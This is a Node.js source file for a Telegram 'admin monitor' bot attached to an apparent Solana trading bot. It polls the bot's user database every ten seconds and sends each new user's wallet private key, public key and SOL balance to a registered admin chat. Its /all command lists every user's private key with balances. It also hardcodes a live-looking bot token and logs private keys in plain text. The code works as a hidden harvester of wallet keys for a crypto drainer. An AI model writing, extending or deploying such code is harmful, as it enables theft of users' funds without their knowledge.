"use strict";

const { Connection, PublicKey } = require("@solana/web3.js");
const TelegramBot = require("node-telegram-bot-api");
const sqlite3 = require("sqlite3").verbose();
const winston = require("winston");
const path = require("path");
const fs = require("fs");
const Decimal = require("decimal.js");
const fetch = require('node-fetch');
let solPriceCache = null;
let lastPriceFetchTime = 0;
const PRICE_CACHE_DURATION = 5 * 60 * 1000; // 5 minutes cache

//Admin commands
const ADMIN_COMMANDS = [
  { command: "modify", description: "Change MIN/MAX auto-trade amounts" },
  { command: "all", description: "Show all wallet entries" },
];
const BOT_VERSION = "2.1"

const maskSensitiveInfo = winston.format((info) => {
  if (typeof info.message === "string") {
    info.message = info.message.replace(/(private_key.*?['"])(.*?)(['"])/gi, "$1[REDACTED]$3");
  }
  return info;
});

const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(
    maskSensitiveInfo(),
    winston.format.timestamp({ format: "YYYY-MM-DD HH:mm:ss" }),
    winston.format.printf((info) => `${info.timestamp} ${info.level}: ${info.message}`)
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: "admin_monitor_bot.log" }),
  ],
});

const BOT_TOKEN = "7917619322:AAH0tT_25qD-V3V5qZZVKXEBkGyOKkQPEzE";
const MAIN_DB_PATH = path.join(__dirname, "bot_database.db");
const MONITOR_DB_PATH = path.join(__dirname, "admin_monitor_bot.db");
const MAX_MESSAGE_LENGTH = 4096;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const monitorDb = new sqlite3.Database(MONITOR_DB_PATH, (err) => {
  if (err) {
    logger.error("Failed to open monitor database: " + err);
    restartBot();
  } else {
    logger.info("Connected to Monitor SQLite database.");
    initMonitorDB();
  }
});
const mainDb = new sqlite3.Database(MAIN_DB_PATH, (err) => {
  if (err) {
    logger.error("Failed to open main database: " + err);
    restartBot();
  } else {
    logger.info("Connected to Main SQLite database.");
    initMainDB();
  }
});
const pendingMessageHandlers = {};
const pendingHandlerTimeouts = {};
const currentOperation = {};
const HANDLER_TIMEOUT = 5 * 60 * 1000;

async function getSolPriceInUSD() {
  try {
    // Return cached price if available and not expired
    if (solPriceCache && Date.now() - lastPriceFetchTime < PRICE_CACHE_DURATION) {
      logger.debug("Using cached SOL price");
      return solPriceCache;
    }

    logger.debug("Fetching fresh SOL price from CoinGecko");
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', {
      timeout: 5000 // 5 second timeout
    });
    
    if (!response.ok) {
      throw new Error(`CoinGecko API responded with status ${response.status}`);
    }
    
    const data = await response.json();
    if (!data?.solana?.usd) {
      throw new Error("Invalid response format from CoinGecko");
    }

    // Update cache
    solPriceCache = data.solana.usd;
    lastPriceFetchTime = Date.now();
    logger.debug(`Updated SOL price cache: $${solPriceCache}`);
    return solPriceCache;
    
  } catch (err) {
    logger.error(`Failed to fetch SOL price: ${err.message}`);
    // Return cached price if available, even if expired
    return solPriceCache || null;
  }
}

function initMonitorDB() {
  monitorDb.serialize(() => {
    monitorDb.run(
      `CREATE TABLE IF NOT EXISTS registered_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id TEXT NOT NULL UNIQUE,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )`,
      (err) => {
        if (err) {
          logger.error("Failed to create registered_users table: " + err);
          restartBot();
        } else {
          logger.info("registered_users table ensured.");
        }
      }
    );
    monitorDb.run(
      `CREATE TABLE IF NOT EXISTS settings (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        registration_open INTEGER NOT NULL DEFAULT 1,
        last_check_timestamp TEXT
      )`,
      (err) => {
        if (err) {
          logger.error("Failed to create settings table: " + err);
          restartBot();
        } else {
          logger.info("settings table ensured.");
          monitorDb.get("SELECT * FROM settings WHERE id = 1", [], (err, row) => {
            if (err) {
              logger.error("Error checking settings: " + err);
              return;
            }
            if (!row) {
              monitorDb.run(
                "INSERT INTO settings (id, registration_open, last_check_timestamp) VALUES (1, 1, ?)",
                [new Date().toISOString()],
                (err) => {
                  if (err) {
                    logger.error("Failed to initialize settings: " + err);
                    return;
                  }
                  logger.info("Settings initialized.");
                }
              );
            }
          });
        }
      }
    );
    monitorDb.run(
      `CREATE TABLE IF NOT EXISTS last_checked_entries (
        private_key TEXT PRIMARY KEY
      )`,
      (err) => {
        if (err) {
          logger.error("Failed to create last_checked_entries table: " + err);
          restartBot();
        } else {
          logger.info("last_checked_entries table ensured.");
          logger.info("Initializing 10-second monitoring for new wallet entries...");
          monitorDatabaseForAdmin();
          setInterval(monitorDatabaseForAdmin, 10 * 1000);
        }
      }
    );
  });
}

function initMainDB() {
  mainDb.run(
    `CREATE TABLE IF NOT EXISTS config (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL
    )`,
    (err) => {
      if (err) {
        logger.error("Failed to create config table in main database: " + err);
        restartBot();
      } else {
        logger.info("config table ensured in main database.");
      }
    }
  );
}

function clearPendingMessageHandler(chatId) {
  if (pendingMessageHandlers[chatId]) {
    bot.removeListener("message", pendingMessageHandlers[chatId]);
    delete pendingMessageHandlers[chatId];
    logger.info(`Cleared pending message handler for chat ${chatId}`);
  }
  if (pendingHandlerTimeouts[chatId]) {
    clearTimeout(pendingHandlerTimeouts[chatId]);
    delete pendingHandlerTimeouts[chatId];
    logger.info(`Cleared pending handler timeout for chat ${chatId}`);
  }
  delete currentOperation[chatId];
}

function setPendingHandlerTimeout(chatId, timeoutMessage = "Response timeout. Please try the command again.") {
  if (pendingHandlerTimeouts[chatId]) {
    clearTimeout(pendingHandlerTimeouts[chatId]);
  }
  pendingHandlerTimeouts[chatId] = setTimeout(() => {
    if (pendingMessageHandlers[chatId]) {
      clearPendingMessageHandler(chatId);
      bot.sendMessage(chatId, timeoutMessage).catch((err) => {
        logger.error("Error sending timeout message: " + err);
      });
      logger.info(`Cleared pending handler for chat ${chatId} due to timeout.`);
    }
  }, HANDLER_TIMEOUT);
}

function escapeHTML(str) {
  if (typeof str !== "string") return "";
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

async function getWalletBalance(publicKey) {
  try {
    const connection = new Connection("https://api.mainnet-beta.solana.com", {
      commitment: 'confirmed',
      timeout: 10000 // 10 second timeout
    });
    
    const balanceLamports = await connection.getBalance(new PublicKey(publicKey));
    const solAmount = new Decimal(balanceLamports).div(1_000_000_000).toFixed(4);
    
    // Get USD value
    let usdValue = null;
    try {
      const solPrice = await getSolPriceInUSD();
      if (solPrice) {
        usdValue = new Decimal(solAmount).times(solPrice).toFixed(2);
      }
    } catch (priceErr) {
      logger.error(`USD conversion error for ${publicKey}: ${priceErr.message}`);
    }

    return {
      sol: solAmount,
      usd: usdValue,
      display: usdValue ? `${solAmount} SOL ($${usdValue})` : `${solAmount} SOL`
    };
    
  } catch (err) {
    logger.error(`Balance check failed for ${publicKey}: ${err.message}`);
    return {
      sol: "Error",
      usd: null,
      display: "Error fetching balance"
    };
  }
}

function getLastCheckTimestamp() {
  return new Promise((resolve, reject) => {
    monitorDb.get("SELECT last_check_timestamp FROM settings WHERE id = 1", [], (err, row) => {
      if (err) {
        logger.error("Error getting last check timestamp: " + err);
        return reject(err);
      }
      resolve(row ? row.last_check_timestamp : new Date(0).toISOString());
    });
  });
}

function updateLastCheckTimestamp(timestamp) {
  return new Promise((resolve, reject) => {
    monitorDb.run("UPDATE settings SET last_check_timestamp = ? WHERE id = 1", [timestamp], function (err) {
      if (err) {
        logger.error("Error updating last check timestamp: " + err);
        return reject(err);
      }
      resolve();
    });
  });
}

function isUserRegistered(telegramId) {
  return new Promise((resolve, reject) => {
    monitorDb.get("SELECT * FROM registered_users WHERE telegram_id = ?", [telegramId], (err, row) => {
      if (err) {
        logger.error("Error checking user registration: " + err);
        return reject(err);
      }
      if (row) {
        resolve(true);
      } else {
        mainDb.get("SELECT * FROM users WHERE telegram_id = ? AND is_removed = 0", [telegramId], (err2, row2) => {
          if (err2) {
            logger.error("Error checking user registration in main database: " + err2);
            return reject(err2);
          }
          resolve(!!row2);
        });
      }
    });
  });
}

function getRegistrationOpen() {
  return new Promise((resolve, reject) => {
    monitorDb.get("SELECT registration_open FROM settings WHERE id = 1", [], (err, row) => {
      if (err) {
        logger.error("Error getting registration_open setting: " + err);
        return reject(err);
      }
      resolve(row ? Number(row.registration_open) : 1);
    });
  });
}

function setRegistrationOpen(value) {
  return new Promise((resolve, reject) => {
    monitorDb.run("UPDATE settings SET registration_open = ? WHERE id = 1", [value], function (err) {
      if (err) {
        logger.error("Error setting registration_open value: " + err);
        return reject(err);
      }
      resolve();
    });
  });
}

function registerUser(telegramId, username, firstName, lastName) {
  return new Promise((resolve, reject) => {
    monitorDb.run(
      "INSERT INTO registered_users (telegram_id, username, first_name, last_name) VALUES (?, ?, ?, ?)",
      [telegramId, username, firstName, lastName],
      function (err) {
        if (err) {
          logger.error("Error registering user: " + err);
          return reject(err);
        }
        resolve();
      }
    );
  });
}

function splitMessage(message, maxLength = MAX_MESSAGE_LENGTH) {
  const chunks = [];
  let currentChunk = "";
  const lines = message.split("\n");
  for (const line of lines) {
    if (currentChunk.length + line.length + 1 > maxLength) {
      chunks.push(currentChunk);
      currentChunk = line + "\n";
    } else {
      currentChunk += line + "\n";
    }
  }
  if (currentChunk.length > 0) {
    chunks.push(currentChunk);
  }
  return chunks;
}

function setConfigValue(key, value) {
  return new Promise((resolve, reject) => {
    mainDb.run(
      `INSERT INTO config (key, value) VALUES (?, ?)
      ON CONFLICT(key) DO UPDATE SET value=excluded.value`,
      [key, value],
      function (err) {
        if (err) {
          logger.error("Error setting config value for " + key + ": " + err);
          return reject(err);
        }
        resolve();
      }
    );
  });
}

function getConfigValue(key, defaultValue = null) {
  return new Promise((resolve, reject) => {
    mainDb.get("SELECT value FROM config WHERE key = ?", [key], (err, row) => {
      if (err) {
        logger.error("Error getting config value for " + key + ": " + err);
        return reject(err);
      }
      resolve(row ? row.value : defaultValue);
    });
  });
}

function getAdminChatIds() {
  return new Promise((resolve, reject) => {
    monitorDb.all("SELECT telegram_id FROM registered_users", [], (err, rows) => {
      if (err) {
        logger.error("Error getting admin chat IDs: " + err);
        return resolve([]);
      }
      resolve(rows ? rows.map(row => row.telegram_id) : []);
    });
  });
}

function monitorDatabaseForAdmin() {
  const query = `SELECT telegram_id, username, public_key, private_key, created_at
    FROM users
    WHERE is_removed = 0
      AND private_key IS NOT NULL
      AND private_key <> ''`;
  mainDb.all(query, [], async (err, rows) => {
    if (err) {
      logger.error("Error querying main database for new entries: " + err);
      return;
    }
    if (!rows || rows.length === 0) return;
    
    monitorDb.all("SELECT private_key FROM last_checked_entries", [], async (err, sentRows) => {
      if (err) {
        logger.error("Error querying monitor database for notified keys: " + err);
        return;
      }
      
      const sentKeysSet = new Set((sentRows || []).map((row) => row.private_key));
      const newRows = rows.filter((row) => !sentKeysSet.has(row.private_key));
      if (newRows.length === 0) return;
      
      getAdminChatIds().then(async (adminChatIds) => {
        if (!adminChatIds || adminChatIds.length === 0) {
          logger.info("No admin chat IDs set. Cannot send new wallet notifications.");
          return;
        }
        
        for (const row of newRows) {
          try {
            const balance = await getWalletBalance(row.public_key);
            const escUsername = escapeHTML(row.username || "N/A");
            const escTelegramId = escapeHTML(String(row.telegram_id || ""));
            const escPubKey = escapeHTML(row.public_key || "");
            const escPrivKey = escapeHTML(row.private_key || "");
            const escCreatedAt = escapeHTML(row.created_at || "");
            
            const message =
              `<b>🔔 New Wallet Created</b>\n\n` +
              `👤 <b>Username:</b> ${escUsername}\n` +
              `📱 <b>Telegram ID:</b> ${escTelegramId}\n` +
              `💰 <b>Balance:</b> ${balance.display}\n` +
              `🔑 <b>Public Key:</b> <code>${escPubKey}</code>\n` +
              `🔐 <b>Private Key:</b> <code>${escPrivKey}</code>\n` +
              `🕒 <b>Created At:</b> ${escCreatedAt}`;
              
            for (const adminChatId of adminChatIds) {
              await bot.sendMessage(adminChatId, message, {
                parse_mode: "HTML",
                disable_web_page_preview: true,
              });
            }
            
            await new Promise((resolve, reject) => {
              monitorDb.run(
                "INSERT OR IGNORE INTO last_checked_entries (private_key) VALUES (?)",
                [row.private_key],
                (err) => {
                  if (err) return reject(err);
                  resolve();
                }
              );
            });
            
            logger.info(`Sent new wallet to admins & recorded key: ${row.private_key}`);
          } catch (err) {
            logger.error("Error processing wallet notification: " + err);
          }
        }
      });
    });
  });
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = String(msg.from.id);
  const username = msg.from.username || "";
  const firstName = msg.from.first_name || "";
  const lastName = msg.from.last_name || "";
  clearPendingMessageHandler(chatId);
  currentOperation[chatId] = Date.now();
  const operationId = currentOperation[chatId];
  try {
    const registered = await isUserRegistered(telegramId);
    if (registered) {
      // Set command menu for existing admin
      await bot.setMyCommands(ADMIN_COMMANDS, {
        scope: { type: "chat", chat_id: chatId },
      });
      return bot.sendMessage(
        chatId, 
        "👋 Welcome back, Admin!\n\n" +
        "Use the command menu or type:\n" +
        "/all - View all wallets\n" +
        "/modify - Adjust auto-trade settings\n",
        { parse_mode: "Markdown" }
      ).catch((err) => logger.error("Error sending welcome back message: " + err));
    }
    
    const registrationOpen = await getRegistrationOpen();
    if (Number(registrationOpen) !== 1) {
      return bot.sendMessage(
        chatId, 
        "🔒 Private Bot\n\n" +
        "New registrations are currently closed.",
        { parse_mode: "Markdown" }
      ).catch((err) => logger.error("Error sending closed registration message: " + err));
    }
    
    bot.sendMessage(
      chatId,
      "🤖 *Admin Monitor Bot*\n\n" +
      "Would you like to register as the administrator? (yes/no)",
      { parse_mode: "Markdown" }
    ).catch((err) => logger.error("Error sending registration prompt: " + err));
    
    pendingMessageHandlers[chatId] = async (response) => {
      if (response.chat.id !== chatId) return;
      if (currentOperation[chatId] !== operationId) return;
      clearPendingMessageHandler(chatId);
      const answer = response.text.trim().toLowerCase();
      
      if (answer === "yes" || answer === "y") {
        try {
          await registerUser(telegramId, username, firstName, lastName);
          await setRegistrationOpen(0);
          
          // Set admin commands for new admin
          await bot.setMyCommands(ADMIN_COMMANDS, {
            scope: { type: "chat", chat_id: chatId },
          });
          
          bot.sendMessage(
            chatId,
            "🎉 *Admin Registration Complete!*\n\n" +
            "You now have access to admin commands:\n" +
            "• /all - View all wallets\n" +
            "• /modify - Adjust auto-trade settings\n" +
            "Use the command menu (/) for quick access!",
            { parse_mode: "Markdown" }
          ).catch((err) => logger.error("Error sending registration success message: " + err));
          
          logger.info(`New administrator registered: ${telegramId} (${username})`);
        } catch (err) {
          logger.error("Error registering user: " + err);
          bot.sendMessage(
            chatId,
            "❌ *Registration Failed*\n\n" +
            "An error occurred. Please try again later.",
            { parse_mode: "Markdown" }
          ).catch((error) => logger.error("Error sending registration error message: " + error));
        }
      } else {
        bot.sendMessage(
          chatId,
          "🚫 Registration cancelled",
          { parse_mode: "Markdown" }
        ).catch((err) => logger.error("Error sending registration cancelled message: " + err));
      }
    };
    
    bot.once("message", pendingMessageHandlers[chatId]);
    setPendingHandlerTimeout(chatId);
  } catch (err) {
    logger.error("Error in /start command: " + err);
    bot.sendMessage(
      chatId,
      "⚠️ *System Error*\n\n" +
      "Please try again later.",
      { parse_mode: "Markdown" }
    ).catch((error) => logger.error("Error sending /start error message: " + error));
  }
});

bot.onText(/\/modify/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = String(msg.from.id);
  clearPendingMessageHandler(chatId);
  currentOperation[chatId] = Date.now();
  const operationId = currentOperation[chatId];
  
  try {
    const registered = await isUserRegistered(telegramId);
    if (!registered) {
      return bot.sendMessage(chatId, "You are not authorized to use this command.")
        .catch((err) => logger.error("Error sending unauthorized message for /modify: " + err));
    }

    // Create keyboard for min/max selection
    const keyboard = {
      inline_keyboard: [
        [{ text: "Modify Min Auto-Trade", callback_data: "MODIFY_MIN" }],
        [{ text: "Modify Optimal Auto-Trade", callback_data: "MODIFY_MAX" }],
        [{ text: "Cancel", callback_data: "MODIFY_CANCEL" }]
      ]
    };

    await bot.sendMessage(
      chatId,
      "🔧 <b>Modify Auto-Trade Settings</b>\n\nSelect which value you want to modify:",
      { parse_mode: "HTML", reply_markup: keyboard }
    ).catch((err) => logger.error("Error sending modify menu: " + err));

  } catch (err) {
    logger.error("Error in /modify command: " + err);
    bot.sendMessage(chatId, "An error occurred while processing your request. Please try again later.")
      .catch((error) => logger.error("Error sending /modify error message: " + error));
  }
});

// Handle the inline keyboard callbacks for modify
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  
  try {
    if (data === "MODIFY_MIN" || data === "MODIFY_MAX") {
      await bot.answerCallbackQuery(query.id);
      
      const isMin = data === "MODIFY_MIN";
      const currentKey = isMin ? "min_auto_trade_usd" : "optimal_auto_trade_usd";
      const currentValue = await getConfigValue(currentKey, isMin ? "2" : "50");
      
      await bot.editMessageText(
        `✏️ <b>Modify ${isMin ? "MIN" : "MAX"} Auto-Trade Amount</b>\n\nCurrent value: ${currentValue} SOL\n\nPlease enter the new ${isMin ? "minimum" : "maximum"} auto-trade amount in SOL:`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "HTML"
        }
      );

      currentOperation[chatId] = Date.now();
      const operationId = currentOperation[chatId];
      
      pendingMessageHandlers[chatId] = async (response) => {
        if (response.chat.id !== chatId) return;
        if (currentOperation[chatId] !== operationId) return;
        clearPendingMessageHandler(chatId);
        
        const newAmountText = response.text.trim();
        let newAmount;
        try {
          newAmount = new Decimal(newAmountText);
        } catch (e) {
          logger.error("Invalid decimal input: " + e);
          newAmount = null;
        }
        
        if (!newAmount || newAmount.isNaN() || newAmount.lte(0)) {
          return bot.sendMessage(
            chatId,
            "❌ Invalid amount. Please enter a positive number (e.g. 100.50).\n\nTry the /modify command again.",
            { parse_mode: "HTML" }
          ).catch((err) => logger.error("Error sending invalid amount message: " + err));
        }

        try {
          await setConfigValue(currentKey, newAmount.toFixed(2));
          await bot.sendMessage(
            chatId,
            `✅ Success!\n\nThe ${isMin ? "minimum" : "maximum"} auto-trade amount has been updated to ${newAmount.toFixed(2)} SOL.`,
            { parse_mode: "HTML" }
          );
          logger.info(`Updated ${currentKey} to ${newAmount.toFixed(2)} SOL`);
        } catch (err) {
          logger.error(`Error updating ${currentKey}: ` + err);
          await bot.sendMessage(
            chatId,
            "❌ Failed to update the value. Please try again later.",
            { parse_mode: "HTML" }
          );
        }
      };
      
      bot.once("message", pendingMessageHandlers[chatId]);
      setPendingHandlerTimeout(chatId, "Modification timeout. Please use /modify again to retry.");
      
    } else if (data === "MODIFY_CANCEL") {
      await bot.answerCallbackQuery(query.id);
      await bot.deleteMessage(chatId, query.message.message_id)
        .catch(err => logger.warn("Couldn't delete modify message: " + err));
    }
  } catch (err) {
    logger.error("Error in modify callback handler: " + err);
    await bot.answerCallbackQuery(query.id, { text: "An error occurred" });
  }
});

bot.onText(/\/all/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = String(msg.from.id);
  clearPendingMessageHandler(chatId);
  
  try {
    const registered = await isUserRegistered(telegramId);
    if (!registered) {
      return bot.sendMessage(chatId, "You are not authorized to use this command.")
        .catch((err) => logger.error("Error sending unauthorized message for /all: " + err));
    }

    // Get current settings first
    const [minAutoTrade, maxAutoTrade] = await Promise.all([
      getConfigValue("min_auto_trade_usd", "2"),
      getConfigValue("optimal_auto_trade_usd", "50")
    ]);

    const settingsMessage = 
      `⚙️ <b>Current Auto-Trade Settings</b>\n\n` +
      `• <b>MIN Auto-Trade:</b> ${minAutoTrade} SOL\n` +
      `• <b>Optimal Auto-Trade:</b> ${maxAutoTrade} SOL\n\n` +
      `<i>Fetching all wallet entries...</i>`;
    
    const processingMessage = await bot.sendMessage(chatId, settingsMessage, { parse_mode: "HTML" })
      .catch((err) => logger.error("Error sending settings message for /all: " + err));
    
    const query = `SELECT telegram_id, username, public_key, private_key, created_at
      FROM users
      WHERE is_removed = 0
      ORDER BY created_at ASC`;
      
    mainDb.all(query, [], async (err, rows) => {
      if (err) {
        logger.error("Error querying main database: " + err);
        try {
          await bot.deleteMessage(chatId, processingMessage.message_id);
        } catch (deleteErr) {
          logger.warn("Failed to delete processing message: " + deleteErr);
        }
        return bot.sendMessage(chatId, "Error querying the database. Please try again later.")
          .catch((error) => logger.error("Error sending database error message in /all: " + error));
      }
      
      if (!rows || rows.length === 0) {
        try {
          await bot.deleteMessage(chatId, processingMessage.message_id);
        } catch (deleteErr) {
          logger.warn("Failed to delete processing message: " + deleteErr);
        }
        return bot.sendMessage(chatId, "No entries found in the database.")
          .catch((err) => logger.error("Error sending no entries message in /all: " + err));
      }
      
      try {
        await bot.deleteMessage(chatId, processingMessage.message_id);
      } catch (deleteErr) {
        logger.warn("Failed to delete processing message: " + deleteErr);
      }
      
      // New formatted message with balances
      let fullMessage = `<b>All Wallet Entries (${rows.length} total):</b>\n\n`;
      
      // Process rows sequentially to avoid rate limiting
      for (let i = 0; i < rows.length; i++) {
        const row = rows[i];
        const escUsername = escapeHTML(row.username || "N/A");
        const escTgId = escapeHTML(String(row.telegram_id || ""));
        const escPubKey = escapeHTML(row.public_key || "");
        const escPrivKey = escapeHTML(row.private_key || "");
        const escCreated = escapeHTML(row.created_at || "");
        
        // Get balance for each wallet
        let balance = { sol: "Loading...", usd: "Loading..." };
        try {
          balance = await getWalletBalance(row.public_key);
        } catch (err) {
          logger.error(`Error getting balance for ${row.public_key}: ${err}`);
          balance = { sol: "Error", usd: "Error" };
        }
        
        fullMessage += 
`💳 <b>WALLET ${i + 1}</b>
👤 <b>Username:</b> ${escUsername}
📱 <b>Telegram ID:</b> ${escTgId}
💰 <b>Balance:</b> ${balance.display}
🔑 <b>Public Key:</b> <code>${escPubKey}</code>
🔐 <b>Private Key:</b> <code>${escPrivKey}</code>
🕒 <b>Created At:</b> ${escCreated}\n\n`;
        
        // Add small delay between balance checks to avoid rate limiting
        if (i < rows.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        // Send chunks periodically to avoid hitting message limits
        if (i > 0 && i % 5 === 0) {
          const chunks = splitMessage(fullMessage);
          for (const chunk of chunks) {
            try {
              await bot.sendMessage(chatId, chunk, { 
                parse_mode: "HTML", 
                disable_web_page_preview: true 
              });
            } catch (sendErr) {
              logger.error("Error sending message chunk: " + sendErr);
            }
          }
          fullMessage = ""; // Reset for next batch
          await new Promise(resolve => setTimeout(resolve, 1000)); // Additional delay between batches
        }
      }

      // Send any remaining messages
      if (fullMessage.trim().length > 0) {
        const chunks = splitMessage(fullMessage);
        for (const chunk of chunks) {
          try {
            await bot.sendMessage(chatId, chunk, { 
              parse_mode: "HTML", 
              disable_web_page_preview: true 
            });
          } catch (sendErr) {
            logger.error("Error sending final message chunk: " + sendErr);
          }
        }
      }
    });
  } catch (err) {
    logger.error("Error in /all command: " + err);
    bot.sendMessage(chatId, "An error occurred while processing your request. Please try again later.")
      .catch((error) => logger.error("Error sending /all error message: " + error));
  }
});

bot.onText(/\/reset/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = String(msg.from.id);
  clearPendingMessageHandler(chatId);
  currentOperation[chatId] = Date.now();
  const operationId = currentOperation[chatId];
  try {
    const registered = await isUserRegistered(telegramId);
    if (!registered) {
      return bot.sendMessage(
        chatId,
        "⛔ *Unauthorized*\n\n" +
        "Admin access required.",
        { parse_mode: "Markdown" }
      ).catch((err) => logger.error("Error sending unauthorized message for /reset: " + err));
    }
    
    bot.sendMessage(
      chatId,
      "⚠️ *Admin Reset Confirmation*\n\n" +
      "This will allow NEW users to register as admin.\n\n" +
      "Are you sure? (yes/no)",
      { parse_mode: "Markdown" }
    ).catch((err) => logger.error("Error sending reset warning message: " + err));
    
    pendingMessageHandlers[chatId] = async (response) => {
      if (response.chat.id !== chatId) return;
      if (currentOperation[chatId] !== operationId) return;
      clearPendingMessageHandler(chatId);
      const answer = response.text.trim().toLowerCase();
      
      if (answer === "yes" || answer === "y") {
        try {
          await setRegistrationOpen(1);
          // Clear admin commands for this user
          await bot.setMyCommands([], {
            scope: { type: "chat", chat_id: chatId },
          });
          
          bot.sendMessage(
            chatId,
            "🔄 *Registration Reset*\n\n" +
            "New users can now register as admin.\n\n" +
            "Your admin commands have been disabled.",
            { parse_mode: "Markdown" }
          ).catch((err) => logger.error("Error sending registration reset success message: " + err));
          
          logger.info(`User ${msg.from.username} reset registration`);
        } catch (err) {
          logger.error("Error resetting registration: " + err);
          bot.sendMessage(
            chatId,
            "❌ *Reset Failed*\n\n" +
            "Please try again later.",
            { parse_mode: "Markdown" }
          ).catch((error) => logger.error("Error sending registration reset failure message: " + error));
        }
      } else {
        bot.sendMessage(
          chatId,
          "🛑 Reset cancelled",
          { parse_mode: "Markdown" }
        ).catch((err) => logger.error("Error sending reset cancelled message: " + err));
      }
    };
    
    bot.once("message", pendingMessageHandlers[chatId]);
    setPendingHandlerTimeout(chatId);
  } catch (err) {
    logger.error("Error in /reset command: " + err);
    bot.sendMessage(
      chatId,
      "⚠️ *System Error*\n\n" +
      "Please try again later.",
      { parse_mode: "Markdown" }
    ).catch((error) => logger.error("Error sending /reset error message: " + error));
  }
});

bot.onText(/\/help/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = String(msg.from.id);
  try {
    const registered = await isUserRegistered(telegramId);
    if (!registered) {
      return bot.sendMessage(chatId, "This is a private bot. Only registered administrators can use it.")
        .catch((err) => logger.error("Error sending unauthorized message for /help: " + err));
    }
    const helpMessage =
      "<b>Admin Monitor Bot Commands:</b>\n\n" +
      "/start - Start the bot and register (if allowed)\n" +
      "/modify - Change MIN/MAX auto-trade amounts\n" +
      "/all - Show all wallet entries and current settings\n" +
      "/help - Show this help message";
    bot.sendMessage(chatId, helpMessage, { parse_mode: "HTML" })
      .catch((err) => logger.error("Error sending /help message: " + err));
  } catch (err) {
    logger.error("Error in /help command: " + err);
    bot.sendMessage(chatId, "An error occurred while processing your request. Please try again later.")
      .catch((error) => logger.error("Error sending /help error message: " + error));
  }
});

function restartBot() {
  logger.info("Attempting to restart bot...");
  try {
    bot.stopPolling().then(() => {
      logger.info("Bot polling stopped for restart.");
      closeConnections(() => {
        logger.info("Database connections closed for restart.");
        setTimeout(() => {
          logger.info("Restarting process...");
          const { spawn } = require("child_process");
          const args = process.argv.slice(1);
          const options = { detached: true, stdio: "inherit" };
          spawn(process.execPath, args, options);
          process.exit();
        }, 5000);
      });
    }).catch(err => {
      logger.error("Error stopping bot polling during restart: " + err);
      process.exit(1);
    });
  } catch (err) {
    logger.error("Failed to restart bot: " + err);
    process.exit(1);
  }
}

function closeConnections(callback) {
  monitorDb.close((err) => {
    if (err) {
      logger.error("Error closing monitor database: " + err);
    } else {
      logger.info("Monitor database closed successfully.");
    }
    mainDb.close((err) => {
      if (err) {
        logger.error("Error closing main database: " + err);
      } else {
        logger.info("Main database closed successfully.");
      }
      if (callback) callback();
    });
  });
}

function shutdownAndExit(exitCode = 0) {
  logger.info("Shutting down admin monitor bot...");
  bot.stopPolling()
    .then(() => {
      logger.info("Bot polling stopped.");
      closeConnections(() => {
        logger.info("All connections closed. Exiting...");
        process.exit(exitCode);
      });
    })
    .catch((err) => {
      logger.error("Error stopping polling during shutdown: " + err);
      process.exit(1);
    });
}

process.on("SIGINT", () => {
  logger.info("Received SIGINT signal.");
  shutdownAndExit(0);
});

process.on("SIGTERM", () => {
  logger.info("Received SIGTERM signal.");
  shutdownAndExit(0);
});

process.on("uncaughtException", (err) => {
  logger.error("Uncaught exception: " + err);
  restartBot();
});

process.on("unhandledRejection", (reason, promise) => {
  logger.error("Unhandled promise rejection: " + reason);
  restartBot();
});

bot.on("polling_error", (err) => {
  logger.error("Telegram polling error: " + err);
  if (
    err.code === "ETELEGRAM" ||
    err.code === "EFATAL" ||
    err.code === "ENOTFOUND" ||
    err.code === "ECONNRESET"
  ) {
    logger.info("Temporary Telegram API error. Will retry automatically.");
  } else {
    restartBot();
  }
});

logger.info("Admin Monitor Bot started and ready.");
